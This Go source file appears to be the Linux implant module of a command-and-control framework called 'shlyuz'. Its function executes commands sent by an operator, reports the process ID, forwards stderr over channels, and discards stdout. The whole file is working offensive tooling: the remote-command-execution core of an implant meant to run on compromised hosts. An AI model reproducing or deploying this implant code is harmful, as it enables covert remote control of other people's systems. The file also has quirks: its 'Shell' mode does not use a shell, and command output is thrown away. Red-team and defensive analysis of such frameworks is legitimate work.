//go:build linux,implant && (!lp || !teamserver)

package fire

import (
	"bufio"
	"errors" // Add errors import
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings"
)

func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel) {
	log.Printf("CmdID %s (Linux): Preparing to execute command: %s, Type: %s", cmdDetails.Id, cmdDetails.Args, cmdDetails.Type)

	var command *exec.Cmd
	var displayCmdLine string // For logging consistency

	if cmdDetails.Type == "Shell" {
		cmdSlice := strings.Split(cmdDetails.Args, " ")
		if len(cmdSlice) == 0 || cmdSlice[0] == "" {
			errMsg := "Args string is empty or invalid for Shell execution."
			log.Printf("CmdID %s (Linux): Error: %s", cmdDetails.Id, errMsg)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: " + errMsg:
				default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
				}
			}
			return
		}
		command = exec.Command(cmdSlice[0], cmdSlice[1:]...)
		displayCmdLine = cmdDetails.Args // For logging consistency, use original args for Shell
		log.Printf("CmdID %s (Linux): Using Shell execution. Command: %s, Args: %v", cmdDetails.Id, cmdSlice[0], cmdSlice[1:])
	} else { // Direct execution
		parts := strings.Split(cmdDetails.Args, " ")
		if len(parts) == 0 || parts[0] == "" {
			errMsg := "Args string is empty or invalid for direct execution."
			log.Printf("CmdID %s (Linux): Error: %s", cmdDetails.Id, errMsg)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: " + errMsg:
				default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
				}
			}
			return
		}
		executable := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}
		command = exec.Command(executable, args...)
		displayCmdLine = cmdDetails.Args // For logging, use original args for Direct as well
		log.Printf("CmdID %s (Linux): Using Direct execution. Command: %s, Args: %v", cmdDetails.Id, executable, args)
	}

	// Common logic for pipe setup, execution, and error/PID reporting
	// Setup Stdout pipe for draining
	cmdOutReader, err := command.StdoutPipe()
	if err != nil {
		errMsg := "Error creating StdoutPipe"
		log.Printf("CmdID %s (Linux): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return
	}
	outScanner := bufio.NewScanner(cmdOutReader)
	go func() {
		// log.Printf("CmdID %s (Linux): Goroutine started for draining stdout.", cmdDetails.Id) // Optional
		for outScanner.Scan() {
			// Drain stdout
		}
		if errScan := outScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Linux): Error draining stdout: %v", cmdDetails.Id, errScan)
		}
		// log.Printf("CmdID %s (Linux): Goroutine finished draining stdout.", cmdDetails.Id) // Optional
	}()

	// Setup Stderr pipe
	cmdErrReader, err := command.StderrPipe()
	if err != nil {
		errMsg := "Error creating StderrPipe"
		log.Printf("CmdID %s (Linux): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return
	}
	errScanner := bufio.NewScanner(cmdErrReader)
	go func() {
		// log.Printf("CmdID %s (Linux): Goroutine started for reading stderr.", cmdDetails.Id) // Optional
		for errScanner.Scan() {
			line := errScanner.Text()
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- line:
				default: log.Printf("CmdID %s (Linux): StdErr channel full, dropping stderr line: %s", cmdDetails.Id, line)
				}
			}
		}
		if errScan := errScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Linux): Error reading stderr: %v", cmdDetails.Id, errScan)
			if execChannels != nil && execChannels.StdErr != nil {
				errMsgPrefix := "Error reading stderr"
				select {
				case execChannels.StdErr <- errMsgPrefix + ": " + errScan.Error():
				default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
				}
			}
		}
		// log.Printf("CmdID %s (Linux): Goroutine finished reading stderr.", cmdDetails.Id) // Optional
	}()

	// Start command
	if err := command.Start(); err != nil {
		errMsg := "Error starting command"
		log.Printf("CmdID %s (Linux): %s. CmdLine for logs: '%s', Error: %v", cmdDetails.Id, errMsg, displayCmdLine, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
		return
	}
	log.Printf("CmdID %s (Linux): Command started successfully (PID: %d). CmdLine for logs: %s", cmdDetails.Id, command.Process.Pid, displayCmdLine)

	// Send PID
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Linux): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}

	// Wait for command completion
	waitErr := command.Wait()
	if waitErr != nil {
		log.Printf("CmdID %s (Linux): Command finished with error: %v. CmdLine for logs: %s", cmdDetails.Id, waitErr, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- waitErr.Error(): 
			default: log.Printf("CmdID %s (Linux): StdErr channel full.", cmdDetails.Id)
			}
		}
	} else {
		log.Printf("CmdID %s (Linux): Command finished successfully. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}
}
